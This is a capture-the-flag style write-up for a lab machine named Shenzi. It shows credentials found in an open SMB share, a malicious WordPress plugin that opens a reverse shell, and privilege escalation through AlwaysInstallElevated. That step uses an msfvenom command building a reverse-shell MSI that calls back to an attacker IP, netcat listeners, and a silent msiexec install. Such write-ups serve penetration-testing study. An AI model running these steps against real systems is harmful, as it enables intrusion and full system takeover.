# Shenzi -  Writeup
## Initial Enumeration
### Port Scanning
```
PORT      STATE    SERVICE
21/tcp    open     ftp (FileZilla ftpd 0.9.41 beta)
80/tcp    open     http (Apache httpd 2.4.43)
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
443/tcp   open     ssl/http (Apache httpd 2.4.43)
445/tcp   open     microsoft-ds
3306/tcp  open     mysql
49664-9/tcp open   msrpc
```
### SMB Enumeration
Enumerated SMB shares and discovered a share named "shenzi" that was accessible without authentication.
Inside this share, found credentials for a WordPress installation:
- Username: admin
- Password: FeltHeadwallWight357
### Web Server Enumeration
The web server is running XAMPP with Apache 2.4.43, PHP 7.4.6, and OpenSSL 1.1.1g.
Default XAMPP page was found at the root, but discovered WordPress installation at `/shenzi`.
## Exploitation
### WordPress Access
1. Navigated to the WordPress admin panel at `http://192.168.145.55/shenzi/wp-admin/`
2. Logged in with the credentials found in the SMB share:
   - Username: admin
   - Password: FeltHeadwallWight357
### Gaining Initial Access
1. From the WordPress admin panel, uploaded a malicious plugin containing PHP code for a reverse shell
2. Set up a listener on my attack machine: `nc -lvnp 4444`
3. Activated the plugin through the WordPress interface
4. Received a reverse shell as the user "shenzi"
## Privilege Escalation
### Enumeration
After gaining initial access, ran PowerUp's `Invoke-PrivEscAudit` to identify potential privilege escalation vectors:
```powershell
Invoke-PrivEscAudit
```
Key findings:
- AlwaysInstallElevated registry keys were enabled
- Several modifiable service files were found (edgeupdate, edgeupdatem)
- Path DLL hijacking opportunities in `C:\Users\shenzi\AppData\Local\Microsoft\WindowsApps`
### Exploiting AlwaysInstallElevated
The `AlwaysInstallElevated` privilege allows standard users to install MSI packages with SYSTEM privileges. When both registry keys below are set to 1, this feature is enabled:
- HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
- HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
Exploitation steps:
1. Created a malicious MSI package with msfvenom:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.183 LPORT=3006 -a x64 --platform Windows -f msi -o evil.msi
   ```
2. Transferred the MSI to the target machine
3. Set up a listener on my attack machine:
   ```bash
   nc -lvnp 3006
   ```
4. Executed the MSI on the target:
   ```powershell
   msiexec /quiet /qn /i C:\Users\shenzi\Downloads\evil.msi
   ```
5. Received a reverse shell with SYSTEM privileges

